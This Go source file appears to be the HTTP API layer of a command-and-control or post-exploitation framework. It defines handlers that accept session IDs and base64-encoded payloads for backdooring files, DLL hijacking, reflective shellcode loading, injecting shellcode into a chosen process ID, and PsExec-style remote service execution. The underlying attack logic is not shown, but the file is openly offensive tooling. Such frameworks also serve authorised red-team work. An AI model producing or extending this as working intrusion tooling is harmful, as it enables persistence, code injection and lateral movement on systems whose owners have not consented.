package api

import (
	"encoding/base64"
	"net/http"
)

// --- Backdoor ---

func (s *Server) handleBackdoor(w http.ResponseWriter, r *http.Request) {
	id, c := s.sessionID(w, r)
	if c == nil {
		return
	}
	var req struct {
		FilePath    string `json:"file_path"`
		ProfileName string `json:"profile_name"`
	}
	if !decodeBody(w, r, &req) {
		return
	}
	if err := c.Backdoor(id, req.FilePath, req.ProfileName); err != nil {
		writeErr(w, http.StatusInternalServerError, err.Error())
		return
	}
	writeJSON(w, http.StatusOK, map[string]bool{"success": true})
}

// --- DLL hijacking ---

func (s *Server) handleHijackDLL(w http.ResponseWriter, r *http.Request) {
	id, c := s.sessionID(w, r)
	if c == nil {
		return
	}
	var req struct {
		ReferenceDLLPath string `json:"reference_dll_path"`
		TargetLocation   string `json:"target_location"`
		ReferenceDLLB64  string `json:"reference_dll_b64"`
		TargetDLLB64     string `json:"target_dll_b64"`
		ProfileName      string `json:"profile_name"`
	}
	if !decodeBody(w, r, &req) {
		return
	}
	var refDLL, targetDLL []byte
	var err error
	if req.ReferenceDLLB64 != "" {
		refDLL, err = base64.StdEncoding.DecodeString(req.ReferenceDLLB64)
		if err != nil {
			writeErr(w, http.StatusBadRequest, "invalid reference_dll_b64")
			return
		}
	}
	if req.TargetDLLB64 != "" {
		targetDLL, err = base64.StdEncoding.DecodeString(req.TargetDLLB64)
		if err != nil {
			writeErr(w, http.StatusBadRequest, "invalid target_dll_b64")
			return
		}
	}
	if err := c.HijackDLL(id, req.ReferenceDLLPath, req.TargetLocation, refDLL, targetDLL, req.ProfileName); err != nil {
		writeErr(w, http.StatusInternalServerError, err.Error())
		return
	}
	writeJSON(w, http.StatusOK, map[string]bool{"success": true})
}

// --- Shellcode RDI ---

func (s *Server) handleShellcodeRDI(w http.ResponseWriter, r *http.Request) {
	c := s.requireClient(w)
	if c == nil {
		return
	}
	var req struct {
		DataB64      string `json:"data_b64"`
		FunctionName string `json:"function_name"`
		Arguments    string `json:"arguments"`
	}
	if !decodeBody(w, r, &req) {
		return
	}
	if req.DataB64 == "" {
		writeErr(w, http.StatusBadRequest, "data_b64 is required")
		return
	}
	data, err := base64.StdEncoding.DecodeString(req.DataB64)
	if err != nil {
		writeErr(w, http.StatusBadRequest, "invalid data_b64")
		return
	}
	result, err := c.ShellcodeRDI(data, req.FunctionName, req.Arguments)
	if err != nil {
		writeErr(w, http.StatusInternalServerError, err.Error())
		return
	}
	writeJSON(w, http.StatusOK, result)
}

// --- Execute shellcode ---

func (s *Server) handleExecuteShellcode(w http.ResponseWriter, r *http.Request) {
	id, c := s.sessionID(w, r)
	if c == nil {
		return
	}
	var req struct {
		DataB64  string `json:"data_b64"`
		Pid      uint32 `json:"pid"`
		RWXPages bool   `json:"rwx_pages"`
	}
	if !decodeBody(w, r, &req) {
		return
	}
	if req.DataB64 == "" {
		writeErr(w, http.StatusBadRequest, "data_b64 is required")
		return
	}
	data, err := base64.StdEncoding.DecodeString(req.DataB64)
	if err != nil {
		writeErr(w, http.StatusBadRequest, "invalid data_b64")
		return
	}
	if err := c.ExecuteShellcode(id, data, req.Pid, req.RWXPages); err != nil {
		writeErr(w, http.StatusInternalServerError, err.Error())
		return
	}
	writeJSON(w, http.StatusOK, map[string]bool{"success": true})
}

// --- PsExec ---

func (s *Server) handlePsExec(w http.ResponseWriter, r *http.Request) {
	id, c := s.sessionID(w, r)
	if c == nil {
		return
	}
	var req struct {
		Hostname     string `json:"hostname"`
		ProfileName  string `json:"profile_name"`
		ServiceName  string `json:"service_name"`
		ServiceDesc  string `json:"service_desc"`
		BinPath      string `json:"bin_path"`
	}
	if !decodeBody(w, r, &req) {
		return
	}
	result, err := c.PsExec(id, req.Hostname, req.ProfileName, req.ServiceName, req.ServiceDesc, req.BinPath)
	if err != nil {
		writeErr(w, http.StatusInternalServerError, err.Error())
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{
		"success": true,
		"message": result["message"],
		"path":    result["path"],
		"service": result["service"],
		"host":    result["hostname"],
	})
}
